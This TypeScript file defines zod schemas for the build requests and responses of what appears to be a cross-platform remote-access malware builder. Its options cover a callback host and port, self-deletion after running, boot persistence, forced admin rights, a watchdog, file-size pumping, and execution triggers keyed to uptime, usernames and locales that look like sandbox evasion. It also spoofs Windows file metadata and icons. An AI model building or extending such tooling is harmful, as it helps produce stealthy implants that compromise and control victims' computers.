import { z } from "zod";

export const TARGET_OS_VALUES = ["windows", "linux", "darwin"] as const;
export type TargetOS = (typeof TARGET_OS_VALUES)[number];

export type TargetArch = "amd64" | "386" | "arm64";

export const TARGET_ARCHITECTURES_BY_OS: Record<
  TargetOS,
  readonly TargetArch[]
> = {
  windows: ["amd64", "386", "arm64"] as const,
  linux: ["amd64", "arm64"] as const,
  darwin: ["amd64", "arm64"] as const,
};

export const ALLOWED_EXTENSIONS_BY_OS: Record<TargetOS, readonly string[]> = {
  windows: [".exe", ".bat"] as const,
  linux: [".bin"] as const,
  darwin: [".bin"] as const,
};

const numericString = z.union([z.string(), z.number()]);

const customHeaderSchema = z
  .object({
    key: z.string(),
    value: z.string(),
  })
  .strict();

const customCookieSchema = z
  .object({
    name: z.string(),
    value: z.string(),
  })
  .strict();

const watchdogSchema = z
  .object({
    enabled: z.boolean(),
    intervalSeconds: z.number().int().positive(),
  })
  .strict();

const filePumperSchema = z
  .object({
    enabled: z.boolean(),
    targetBytes: z.number().int().positive(),
  })
  .strict();

const executionTriggersSchema = z
  .object({
    delaySeconds: z.number().int().nonnegative().optional(),
    minUptimeMinutes: z.number().int().nonnegative().optional(),
    allowedUsernames: z.array(z.string()).optional(),
    allowedLocales: z.array(z.string()).optional(),
    requireInternet: z.boolean().optional(),
    startTime: z.string().optional(),
    endTime: z.string().optional(),
  })
  .strict();

const fileIconSchema = z
  .object({
    name: z.string().optional().nullable(),
    data: z.string(),
  })
  .strict();

const windowsFileInformationSchema = z
  .object({
    fileDescription: z.string().optional(),
    productName: z.string().optional(),
    companyName: z.string().optional(),
    productVersion: z.string().optional(),
    fileVersion: z.string().optional(),
    originalFilename: z.string().optional(),
    internalName: z.string().optional(),
    legalCopyright: z.string().optional(),
  })
  .strict();

export const buildRequestSchema = z
  .object({
    host: z.union([z.string(), z.number()]),
    port: numericString.optional(),
    outputFilename: z.string().optional(),
    outputExtension: z.string().optional(),
    targetOS: z.enum(TARGET_OS_VALUES).optional(),
    targetArch: z.enum(["amd64", "386", "arm64"]).optional(),
    installationPath: z.string().optional(),
    meltAfterRun: z.boolean().optional(),
    startupOnBoot: z.boolean().optional(),
    developerMode: z.boolean().optional(),
    mutexName: z.string().optional(),
    compressBinary: z.boolean().optional(),
    forceAdmin: z.boolean().optional(),
    pollIntervalMs: numericString.optional(),
    maxBackoffMs: numericString.optional(),
    shellTimeoutSeconds: numericString.optional(),
    watchdog: watchdogSchema.optional(),
    filePumper: filePumperSchema.optional(),
    executionTriggers: executionTriggersSchema.optional(),
    customHeaders: z.array(customHeaderSchema).optional(),
    customCookies: z.array(customCookieSchema).optional(),
    fileIcon: fileIconSchema.optional(),
    fileInformation: windowsFileInformationSchema.optional(),
  })
  .strict();

export type BuildRequest = z.infer<typeof buildRequestSchema>;

export const buildResponseSchema = z
  .object({
    success: z.boolean(),
    message: z.string(),
    outputPath: z.string().optional(),
    downloadUrl: z.string().optional(),
    log: z.array(z.string()).optional(),
    sharedSecret: z.string().optional(),
    warnings: z.array(z.string()).optional(),
  })
  .strict();

export type BuildResponse = z.infer<typeof buildResponseSchema>;
